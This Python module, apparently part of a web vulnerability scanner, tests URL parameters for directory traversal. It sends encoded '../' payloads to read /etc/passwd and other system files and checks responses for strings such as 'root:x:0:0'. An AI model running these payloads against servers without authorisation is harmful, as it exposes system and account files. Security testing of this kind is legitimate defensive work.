# modules/traversal_tester.py
# Tests for directory traversal / path traversal vulnerabilities
# Attempts to read system files via manipulated file path parameters

import requests

# Traversal sequences — different encodings bypass different filters
TRAVERSAL_SEQUENCES = [
    "../",
    "..\\",
    "%2e%2e%2f",          # URL encoded ../
    "%2e%2e/",
    "..%2f",
    "%2e%2e%5c",          # URL encoded ..\
]

# Target files that exist on almost every Linux system
LINUX_TARGETS = [
    "etc/passwd",
    "etc/hosts",
    "etc/hostname",
    "proc/version",
]

# Strings that confirm we successfully read those files
LINUX_INDICATORS = {
    "etc/passwd":   "root:x:0:0",
    "etc/hosts":    "127.0.0.1",
    "etc/hostname": "",
    "proc/version": "linux version",
}

# Common parameter names that suggest file loading
FILE_PARAMS = ["file", "page", "path", "template", "view", "doc", "document", "load"]


def test_traversal(url, params=None):
    """
    Tests for directory traversal vulnerabilities.
    Tries to read system files via path manipulation in URL parameters.

    Args:
        url: target URL
        params: dict of parameters to test — prioritises file-like param names

    Returns:
        list of findings
    """
    print(f"\n[*] Testing for directory traversal on {url}...")

    findings = []

    # Use provided params or default to common file parameter names
    if not params:
        params = {p: "index.html" for p in FILE_PARAMS}

    for param_name in params:
        for target_file in LINUX_TARGETS:
            for sequence in TRAVERSAL_SEQUENCES:
                # Build traversal payload — 6 levels deep covers most cases
                payload = (sequence * 6) + target_file

                test_params = params.copy()
                test_params[param_name] = payload

                try:
                    response = requests.get(url, params=test_params, timeout=5)
                    body = response.text.lower()

                    indicator = LINUX_INDICATORS.get(target_file, "")

                    if indicator and indicator in body:
                        finding = {
                            "type": "Directory Traversal",
                            "parameter": param_name,
                            "payload": payload,
                            "target_file": target_file,
                            "evidence": f"Content of {target_file} found in response",
                            "url": response.url
                        }
                        findings.append(finding)
                        print(f"[!] POSSIBLE TRAVERSAL — param={param_name}")
                        print(f"    Read {target_file} via {sequence} encoding")
                        break

                except requests.RequestException:
                    pass

    if not findings:
        print(f"[-] No traversal indicators found")

    return findings